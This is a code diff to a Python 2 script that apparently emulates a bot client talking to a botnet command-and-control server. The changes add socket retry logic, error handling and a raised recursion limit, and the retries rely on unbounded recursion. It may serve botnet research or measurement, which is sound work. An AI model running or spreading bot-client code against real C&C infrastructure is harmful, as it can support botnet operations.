@@ -26,6 +26,9 @@ from utils import hexdump, get_ip_address
 from c_types_defines import *
 from termcolor import cprint
 
+# Increment max recursion depth
+sys.setrecursionlimit(10000)
+
 # Enable/Disable debug mode
 DBG = False
 
@@ -52,22 +55,30 @@ RC_ACCOUNTS = 9
 
 # Initialise network socket
 def init_socket(iface, timeout=None):
-    # Socket configurations
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind((get_ip_address(iface), 0))
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    except:
+        # Catch: "error: [Errorno 24] too many open files"
+        # i.e. reached max number of socket which can be opened
+        return None
 
+    # Socket configurations
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     if timeout:
         s.settimeout(timeout)
 
     # Connect
     try:
+        s.bind((get_ip_address(iface), 0))
         s.connect((HOST, PORT))
-    except socket.error as e:
+    except (IOError, socket.error) as e:
+        # IOError is caught when you try to assign a IP addres
+        # to a virtual network interface that is already used.
         #sys.exit(str(e))
 
         # Try again
-        init_socket(iface, timeout)
+        time.sleep(1)
+        s = init_socket(iface, timeout)
 
     return s
 
@@ -151,6 +162,16 @@ def process_package(rcvmsg, rtt=0, dbg=False, print_cmd=True):
 
         return bid
 
+# Persistently try to send data, ignoring buffer size of receiver
+def send_data(sock, data):
+    try:
+        sock.sendall(data)
+    except socket.timeout:
+        time.sleep(1)
+        send_data(sock, data)
+    except socket.error:
+        print "[-] Error whle sending data to server"
+
 # Communicate with the botnet C&C server
 def communicate(s, dbg=False, print_cmd=True, timeout=0):
     # Initialise recv buffer
@@ -166,7 +187,7 @@ def communicate(s, dbg=False, print_cmd=True, timeout=0):
 
     data = generate_package(bid, dbg=dbg)
     start = time.time() # Start timer
-    s.sendall(data)
+    send_data(s, data)
 
     if dbg:
         cprint("[+] Sent! Now waiting to receive data...", "green")
@@ -206,7 +227,7 @@ def communicate(s, dbg=False, print_cmd=True, timeout=0):
 
                 # Restart timer and send data
                 start = time.time()
-                s.sendall(data)
+                send_data(s, data)
 
                 # Clear recv buffer
                 buf = ""
@@ -224,11 +245,12 @@ def main():
     # Initialise network socket
     s = init_socket(IFACE, TIMEOUT)
 
-    # Start communication with the C&C server
-    communicate(s, dbg=DBG, timeout=TIMEOUT)
+    if s:
+        # Start communication with the C&C server
+        communicate(s, dbg=DBG, timeout=TIMEOUT)
 
-    # Close socket
-    s.close()
+        # Close socket
+        s.close()
 
 if __name__ == "__main__":
     main()
